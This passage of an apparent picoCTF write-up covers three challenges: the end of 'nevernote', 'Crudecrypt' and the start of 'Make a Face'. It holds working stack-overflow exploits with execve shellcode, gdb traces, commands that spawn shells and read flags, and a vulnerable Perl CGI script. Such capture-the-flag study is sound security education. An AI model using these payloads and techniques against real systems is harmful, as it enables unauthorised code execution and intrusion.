</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="s">&quot;bleh&quot;</span><span class="p">;</span> <span class="n">echo</span> <span class="s">&quot;a&quot;</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">512</span><span class="o">-</span><span class="mi">23</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x90\x90\x90\x90</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x50\xc0\x04\x08CC</span><span class="s">CCCCCCCCCCCCCC</span><span class="se">\x70\xc0\x04\x08\x50\xc0\x04\x08FF</span><span class="s">FF&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'>
</span><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span><span class="p">;</span> <span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="p">.</span><span class="o">/</span><span class="n">nevernote</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span> <span class="n">Enter</span> <span class="n">a</span> <span class="nl">command</span><span class="p">:</span> <span class="n">Write</span> <span class="n">your</span> <span class="nl">note</span><span class="p">:</span>
</span><span class='line'><span class="n">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">11066</span><span class="p">(</span><span class="n">pico1139</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span> <span class="n">egid</span><span class="o">=</span><span class="mi">1011</span><span class="p">(</span><span class="n">nevernote</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span>
</span><span class='line'><span class="n">whoami</span>
</span><span class='line'><span class="n">pico1139</span>
</span><span class='line'><span class="n">cat</span> <span class="n">flag</span><span class="o">*</span>
</span><span class='line'><span class="n">the_hairy_canary_fairy_is_still_very_wary</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>the_hairy_canary_fairy_is_still_very_wary</code>.</p>

<h1>Crudecrypt (180 points)</h1>

<p>We are given access to a program that can encrypt and decrypt a file. The program does not try to sanitize user input when decrypting:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">decrypt_file</span><span class="p">(</span><span class="kt">FILE</span><span class="o">*</span> <span class="n">enc_file</span><span class="p">,</span> <span class="kt">FILE</span><span class="o">*</span> <span class="n">raw_file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">file_size</span><span class="p">(</span><span class="n">enc_file</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">enc_buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="n">fread</span><span class="p">(</span><span class="n">enc_buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">enc_file</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">decrypt_buffer</span><span class="p">(</span><span class="n">enc_buf</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;There was an error decrypting the file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">raw_buf</span> <span class="o">=</span> <span class="n">enc_buf</span><span class="p">;</span>
</span><span class='line'>    <span class="n">file_header</span><span class="o">*</span> <span class="n">header</span> <span class="o">=</span> <span class="p">(</span><span class="n">file_header</span><span class="o">*</span><span class="p">)</span> <span class="n">raw_buf</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">header</span><span class="o">-&gt;</span><span class="n">magic_number</span> <span class="o">!=</span> <span class="n">MAGIC</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Invalid password!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">check_hostname</span><span class="p">(</span><span class="n">header</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[#] Warning: File not encrypted by current machine.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// snip</span>
</span><span class='line'>
</span><span class='line'><span class="kt">bool</span> <span class="n">check_hostname</span><span class="p">(</span><span class="n">file_header</span><span class="o">*</span> <span class="n">header</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">saved_host</span><span class="p">[</span><span class="n">HOST_LEN</span><span class="p">],</span> <span class="n">current_host</span><span class="p">[</span><span class="n">HOST_LEN</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// unsafe strncpy if we supply a large string for header-&gt;host</span>
</span><span class='line'>    <span class="n">strncpy</span><span class="p">(</span><span class="n">saved_host</span><span class="p">,</span> <span class="n">header</span><span class="o">-&gt;</span><span class="n">host</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">header</span><span class="o">-&gt;</span><span class="n">host</span><span class="p">));</span>
</span><span class='line'>    <span class="n">safe_gethostname</span><span class="p">(</span><span class="n">current_host</span><span class="p">,</span> <span class="n">HOST_LEN</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">saved_host</span><span class="p">,</span> <span class="n">current_host</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>If the attacker can supply an encrypted file header with a large host field, then we can overflow the saved_host array on the stack &amp; overwrite EIP. We modified the source of crudecrypt.c to generate such a file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">encrypt_file</span><span class="p">(</span><span class="kt">FILE</span><span class="o">*</span> <span class="n">raw_file</span><span class="p">,</span> <span class="kt">FILE</span><span class="o">*</span> <span class="n">enc_file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">file_size</span><span class="p">(</span><span class="n">raw_file</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">size_t</span> <span class="n">block_size</span> <span class="o">=</span> <span class="n">MULT_BLOCK_SIZE</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">file_header</span><span class="p">)</span> <span class="o">+</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">padded_block</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">block_size</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">file_header</span> <span class="n">header</span><span class="p">;</span>
</span><span class='line'>    <span class="n">init_file_header</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">//safe_gethostname(header.host, HOST_LEN);</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">header</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>We encrypted the payload using this modified crudecrypt.c. Then we decrypted it, observing the crash!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#0  0x45454545 in ?? ()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
</span><span class='line'><span class="n">eax</span>            <span class="mh">0xffffff00</span>  <span class="o">-</span><span class="mi">256</span>
</span><span class='line'><span class="n">ecx</span>            <span class="mh">0x73</span>    <span class="mi">115</span>
</span><span class='line'><span class="n">edx</span>            <span class="mh">0xffffd660</span>  <span class="o">-</span><span class="mi">10656</span>   <span class="o">&gt;</span> <span class="n">perfect</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">start</span> <span class="n">of</span> <span class="n">buffer</span>
</span><span class='line'><span class="n">ebx</span>            <span class="mh">0xf7dea000</span>  <span class="o">-</span><span class="mi">136404992</span>
</span><span class='line'><span class="n">esp</span>            <span class="mh">0xffffd690</span>  <span class="mh">0xffffd690</span>
</span><span class='line'><span class="n">ebp</span>            <span class="mh">0x44444444</span>  <span class="mh">0x44444444</span>
</span><span class='line'><span class="n">esi</span>            <span class="mh">0x0</span> <span class="mi">0</span>
</span><span class='line'><span class="n">edi</span>            <span class="mh">0x0</span> <span class="mi">0</span>
</span><span class='line'><span class="n">eip</span>            <span class="mh">0x45454545</span>  <span class="mh">0x45454545</span>
</span><span class='line'><span class="n">eflags</span>         <span class="mh">0x10286</span> <span class="p">[</span> <span class="n">PF</span> <span class="n">SF</span> <span class="n">IF</span> <span class="n">RF</span> <span class="p">]</span>
</span><span class='line'><span class="n">cs</span>             <span class="mh">0x23</span>    <span class="mi">35</span>
</span><span class='line'><span class="n">ss</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">ds</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">es</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">fs</span>             <span class="mh">0x0</span> <span class="mi">0</span>
</span><span class='line'><span class="n">gs</span>             <span class="mh">0x63</span>    <span class="mi">99</span>
</span></code></pre></td></tr></table></div></figure>


<p>Looks like ALSR is off! There was no <code>jmp edx</code> in the binary that I could find, so instead, let&rsquo;s just jump to the buffer:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">encrypt_file</span><span class="p">(</span><span class="kt">FILE</span><span class="o">*</span> <span class="n">raw_file</span><span class="p">,</span> <span class="kt">FILE</span><span class="o">*</span> <span class="n">enc_file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">file_size</span><span class="p">(</span><span class="n">raw_file</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">size_t</span> <span class="n">block_size</span> <span class="o">=</span> <span class="n">MULT_BLOCK_SIZE</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">file_header</span><span class="p">)</span> <span class="o">+</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">padded_block</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">block_size</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">file_header</span> <span class="n">header</span><span class="p">;</span>
</span><span class='line'>    <span class="n">init_file_header</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">//safe_gethostname(header.host, HOST_LEN);</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80</span><span class="s">&quot;&quot;BBCCCCDDDD</span><span class="se">\x30\xd6\xff\xff</span><span class="s">&quot;&quot;FFFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">header</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>compile &amp; run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">bas</span><span class="err">@</span><span class="nl">tritonal</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="o">/</span><span class="n">picoctf</span><span class="o">/</span><span class="n">crudecrypt</span><span class="err">$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">exploit</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">lcrypto</span> <span class="o">-</span><span class="n">lmcrypt</span> <span class="o">-</span><span class="n">lssl</span> <span class="o">-</span><span class="n">m32</span>
</span><span class='line'><span class="n">bas</span><span class="err">@</span><span class="nl">tritonal</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="o">/</span><span class="n">picoctf</span><span class="o">/</span><span class="n">crudecrypt</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span> <span class="n">encrypt</span> <span class="p">.</span><span class="o">/</span><span class="n">a</span> <span class="p">.</span><span class="o">/</span><span class="n">b</span>
</span><span class='line'><span class="o">-=-</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">CrudeCrypt</span> <span class="mf">0.1</span> <span class="n">Beta</span> <span class="o">-=-</span>
</span><span class='line'><span class="o">-&gt;</span> <span class="n">File</span> <span class="nl">password</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'><span class="o">=&gt;</span> <span class="n">Encrypted</span> <span class="n">file</span> <span class="n">successfully</span>
</span><span class='line'><span class="o">***</span> <span class="n">Error</span> <span class="n">in</span> <span class="err">`</span><span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="err">&#39;</span><span class="o">:</span> <span class="n">free</span><span class="p">()</span><span class="o">:</span> <span class="n">invalid</span> <span class="nl">pointer</span><span class="p">:</span> <span class="mh">0x0920f300</span> <span class="o">***</span>
</span><span class='line'><span class="n">Aborted</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>
</span><span class='line'><span class="n">bas</span><span class="err">@</span><span class="nl">tritonal</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="o">/</span><span class="n">picoctf</span><span class="o">/</span><span class="n">crudecrypt</span><span class="err">$</span> <span class="n">cat</span> <span class="n">b</span> <span class="o">|</span><span class="n">base64</span>
</span><span class='line'><span class="n">qmikXTf65Xauen</span><span class="o">/</span><span class="n">t3a0FDf1uZMI3baSe5I9hTVEJ5t04R0Vb8RgBltvIwvCvmbaOtou7THTwR5Vy</span>
</span><span class='line'><span class="n">B9dA2GyFxMLF</span><span class="o">/</span><span class="n">wyNDY9V</span><span class="o">/</span><span class="n">y2bveRKWLam5xehXkNXQFSMhUJcd3RNwfgFxVlYswx4VfW1CiqmV45S</span>
</span><span class='line'><span class="n">ZzbvWLRmeRdk1vyxXQSq0nyDhcPi8GhwnKp6R1ri</span>
</span></code></pre></td></tr></table></div></figure>


<p>We transferred base64 encoded payload to remote machine. We had to adjust the pointer to the shellcode because the address changes on stack due to environment changing. We found this new pointer by simply running gdb.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="p">.</span><span class="c1">///////////////crude_crypt decrypt ./sp ./bleh</span>
</span><span class='line'><span class="o">-=-</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">CrudeCrypt</span> <span class="mf">0.1</span> <span class="n">Beta</span> <span class="o">-=-</span>
</span><span class='line'><span class="o">-&gt;</span> <span class="n">File</span> <span class="nl">password</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'><span class="n">Segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="cp">#0  0xffffd674 in ?? ()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
</span><span class='line'><span class="n">eax</span>            <span class="mh">0xffffff00</span>  <span class="o">-</span><span class="mi">256</span>
</span><span class='line'><span class="n">ecx</span>            <span class="mh">0xb4</span>    <span class="mi">180</span>
</span><span class='line'><span class="n">edx</span>            <span class="mh">0xffffd5f2</span>  <span class="o">-</span><span class="mi">10766</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0xffffd5f2</span>
</span><span class='line'><span class="mh">0xffffd5f2</span><span class="o">:</span>    <span class="s">&quot;Ph//shh/bin</span><span class="se">\211\343\215</span><span class="s">T$</span><span class="se">\b</span><span class="s">...BBCCCCDDDD&quot;</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">i</span> <span class="mh">0xffffd5f0</span>
</span><span class='line'>   <span class="mh">0xffffd5f0</span><span class="o">:</span> <span class="n">xor</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
</span><span class='line'>   <span class="mh">0xffffd5f2</span><span class="o">:</span> <span class="n">push</span>   <span class="o">%</span><span class="n">eax</span>
</span></code></pre></td></tr></table></div></figure>


<p>After adjusting the address to <code>0xffffd5f0</code> in the exploit, we end up with a shell! A NOP sled would&rsquo;ve been easy, in this case.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">b</span> <span class="o">|</span><span class="n">base64</span> <span class="o">-</span><span class="n">d</span> <span class="o">&gt;</span> <span class="p">.</span><span class="o">/</span><span class="n">sp</span>
</span><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">crudecrypt</span><span class="o">/</span><span class="n">crude_crypt</span> <span class="n">decrypt</span> <span class="p">.</span><span class="o">/</span><span class="n">sp</span> <span class="p">.</span><span class="o">/</span><span class="n">bleh</span>
</span><span class='line'><span class="o">-=-</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">CrudeCrypt</span> <span class="mf">0.1</span> <span class="n">Beta</span> <span class="o">-=-</span>
</span><span class='line'><span class="o">-&gt;</span> <span class="n">File</span> <span class="nl">password</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'><span class="err">$</span> <span class="n">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">11066</span><span class="p">(</span><span class="n">pico1139</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span> <span class="n">egid</span><span class="o">=</span><span class="mi">1012</span><span class="p">(</span><span class="n">crudecrypt</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span>
</span><span class='line'><span class="err">$</span> <span class="n">whoami</span>
</span><span class='line'><span class="n">pico1139</span>
</span><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">crudecrypt</span><span class="o">/</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span><span class='line'><span class="n">writing_software_is_hard</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>writing_software_is_hard</code>.</p>

<h1>Make a Face (100 points)</h1>

<p>We need to exploit a perl script running on a Webpage. This script takes user input and generates an &ldquo;avatar&rdquo;. We immediately figured Shellshock but this turned out to be wrong. The script is included in the webpage source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
</span><span class='line'>
</span><span class='line'><span class="k">use</span> <span class="n">CGI</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$q</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CGI</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Head&#39;</span><span class="p">)))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">print</span> <span class="nv">$q</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">(</span><span class="o">-</span><span class="n">type</span><span class="o">=&gt;</span><span class="s">&#39;image/bmp&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">HEAD</span><span class="p">,</span><span class="s">&quot;head&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Head&#39;</span><span class="p">));</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">HAIR</span><span class="p">,</span><span class="s">&quot;hair&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Hair&#39;</span><span class="p">));</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">NOSE</span><span class="p">,</span><span class="s">&quot;nose&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Nose&#39;</span><span class="p">));</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">MOUTH</span><span class="p">,</span><span class="s">&quot;mouth&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Mouth&#39;</span><span class="p">));</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">EYES</span><span class="p">,</span><span class="s">&quot;eyes&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Eyes&#39;</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="nb">read</span><span class="p">(</span><span class="n">HEAD</span><span class="p">,</span><span class="nv">$headb</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">read</span><span class="p">(</span><span class="n">HAIR</span><span class="p">,</span><span class="nv">$hairb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
